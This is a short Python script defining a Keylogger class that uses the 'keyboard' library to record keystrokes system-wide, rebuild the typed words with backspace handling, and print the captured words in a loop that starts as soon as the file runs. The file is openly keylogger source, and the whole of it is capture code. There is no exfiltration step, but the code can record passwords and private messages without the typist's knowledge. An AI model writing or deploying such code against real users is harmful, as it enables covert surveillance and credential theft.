import keyboard
  

class Keylogger():
    def __init__(self):
        self.on = False
        self.non_words = ["caps lock","shift","esc" ,"tab","ctrl","right alt","alt","right alt","page up","page down","up","down","right","left","right shift","enter","f1","f2","f3","f4","f5","f6","f7","f8","f9","f10","f11","f12","home","insert","end","delete","backspace","space"]   
        self.words_captured = []

    def start(self):
        self.on = True

        while self.on == True:
            rk = keyboard.record(until ='Spacebar')
            
            word = ""
            for i in rk:
                if i.event_type == "up" and i.name not in self.non_words: 
                    word += i.name

                if i.name == "backspace" and i.event_type == "down":
                    if word == "":
                        index = len(self.words_captured) - 1

                        if index >= 0:
                            prev_word = self.words_captured[index]
                            self.words_captured.pop(index)
                            prev_word = prev_word[:-1]

                            if prev_word != '':
                                self.words_captured.append(prev_word)

                    else:
                        word = word[:-1]
                
                if i.name == "space" and i.event_type == "up":
                    word += ' '

            if word != '':
                self.words_captured.append(word)
            print(self.words_captured)
    
    def stop(self):
        self.on = False
         
rec = Keylogger()
rec.start() 